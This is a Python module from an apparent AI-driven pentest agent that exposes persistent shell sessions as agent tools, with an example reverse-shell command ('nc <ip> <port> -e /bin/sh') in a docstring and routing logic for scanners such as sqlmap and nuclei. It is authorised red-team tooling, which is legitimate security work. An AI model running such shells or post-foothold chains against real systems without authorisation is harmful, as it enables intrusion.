"""Interactive shell-session tools (post-foothold).

Exposes the existing ``ShellSession`` manager (``kryon.tools.common._sessions``)
as ``@function_tool`` entry points so the agent can drive a PERSISTENT
interactive shell — spawn a listener / reverse shell, send follow-up commands,
and read incremental output — instead of issuing one-shot ``run_command``
calls. This is what lets the model pipeline a post-foothold chain in a single
session rather than re-establishing context every turn.

The underlying functions already exist and are used internally as plain
callables; this module only wraps them, leaving ``_sessions.py`` untouched
(same additive pattern as ``tools/sqlmap_dump.py``).

Banca-safe contract: these are registered into the tool registry ONLY under
``KRYON_RED_TEAM`` (the active-pentest profile, which requires written
authorization) — see ``tool_budget.POST_EXPLOITATION_TOOLS``. The
compliance/banking default never sees them.
"""

from __future__ import annotations

from kryon.sdk.agents import function_tool
from kryon.tools.common._sessions import (
    create_shell_session as _create,
    get_session_output as _get_output,
    list_shell_sessions as _list,
    send_to_session as _send,
    terminate_session as _terminate,
)

# One-shot batch tools that belong in ``run_command`` (synchronous, 900s timeout,
# returns the real result), NOT in a persistent async session. Routing these here
# was the root of a live loop: ``shell_session_start`` returns "started" in ~0s
# (the command runs in a background thread), the model never sees the output, and
# reissues the identical command (~40× observed with sqlmap --dump) instead of
# reading ``shell_session_output``. Mirrors ``run_command``'s ``long_tools``.
_BATCH_TOOLS = frozenset({
    "gobuster", "dirb", "feroxbuster", "ffuf", "wfuzz", "nuclei", "nikto",
    "wpscan", "sqlmap", "amass", "masscan", "subfinder",
    # HTTP one-shot clients: curl/wget make a request and exit — they never need a
    # persistent session. Routing curl through shell_session_start was a live loop
    # (THM 'Hollow Shell'): the login POST ran fire-and-forget, the model never saw
    # the response body, and relaunched it 6× (a fresh session each time) until the
    # StuckDetector aborted at turn 8. run_command waits and returns the body so the
    # model can read the login result and chain to the file-upload step.
    "curl", "wget",
})  # fmt: skip


@function_tool
def shell_session_start(command: str) -> str:
    """Start a persistent interactive shell session and return its id.

    Use this when you need to keep a shell alive across turns (e.g. launch
    ``nc <ip> <port> -e /bin/sh``, an interpreter, or an interactive tool)
    and then drive it with ``shell_session_input`` / ``shell_session_output``.
    For a single non-interactive command, prefer ``run_command``.

    Args:
        command: The command that starts the session (e.g. a reverse-shell
            handler or interactive program).

    Returns:
        The session id to use with the other shell_session_* tools, plus any
        immediate startup output.
    """
    # A one-shot batch tool (sqlmap/nuclei/...) does not belong in a persistent
    # session: start() is fire-and-forget, so the model gets "started" with no
    # data and loops relaunching it. Redirect to run_command (waits + returns
    # the real output) BEFORE spawning anything.
    _first = (command or "").strip().split(" ", 1)[0].split("/")[-1].lower()
    if _first in _BATCH_TOOLS:
        return (
            f"'{_first}' is a one-shot batch tool, not an interactive session. "
            f"Call run_command with command={command!r} instead — it waits for "
            f"completion and returns the full output. shell_session_* is only for "
            f"persistent interactive shells (nc listeners, interpreters)."
        )
    # DEDUP GUARD — relaunching the SAME start command was a live loop (the model
    # relaunching instead of reading shell_session_output). On the 3rd+ identical
    # command, redirect instead of looping (mirrors shell_session_input's guard).
    from kryon.tools.common.command_dedup import check_repeat

    _dup = check_repeat(f"session_start:{command}")
    if _dup:
        return _dup

    sid = _create(command)
    if not sid or str(sid).startswith("Failed"):
        return str(sid) or "Failed to start session"
    initial = _get_output(sid, clear=False)
    return f"[session {sid}] started. Read more with shell_session_output('{sid}').\n{initial}".rstrip()


@function_tool
def shell_session_input(session_id: str, data: str) -> str:
    """Send a line of input to a running shell session.

    Args:
        session_id: Session id returned by ``shell_session_start`` (accepts the
            real id or a friendly alias like ``S1``).
        data: The line to send (a trailing newline is added automatically).

    Returns:
        A short status string.
    """
    # DEDUP GUARD — sending the SAME input to a session repeatedly was an early
    # live loop (the model re-issuing an identical shell line without reading the
    # output). On the 3rd identical (session, data), redirect instead of looping.
    from kryon.tools.common.command_dedup import check_repeat

    _dup = check_repeat(f"session:{session_id}:{data}")
    if _dup:
        return _dup
    return _send(session_id, data)


@function_tool
def shell_session_output(session_id: str, clear: bool = True) -> str:
    """Read buffered output from a shell session.

    Args:
        session_id: Session id (real id or friendly alias like ``S1``).
        clear: If True (default) the returned output is consumed; pass False to
            peek without clearing the buffer.

    Returns:
        The buffered output, or a not-found message.
    """
    return _get_output(session_id, clear=clear)


@function_tool
def shell_session_close(session_id: str) -> str:
    """Terminate a shell session and free its resources.

    Args:
        session_id: Session id (real id or friendly alias like ``S1``).

    Returns:
        A short status string.
    """
    return _terminate(session_id)


@function_tool
def shell_session_list() -> str:
    """List the active shell sessions (id, command, running, last activity)."""
    sessions = _list()
    if not sessions:
        return "No active shell sessions."
    return "\n".join(
        f"{s.get('friendly_id') or s['session_id']}  {s['command']!r}  "
        f"running={s['running']}  last={s['last_activity']}"
        for s in sessions
    )
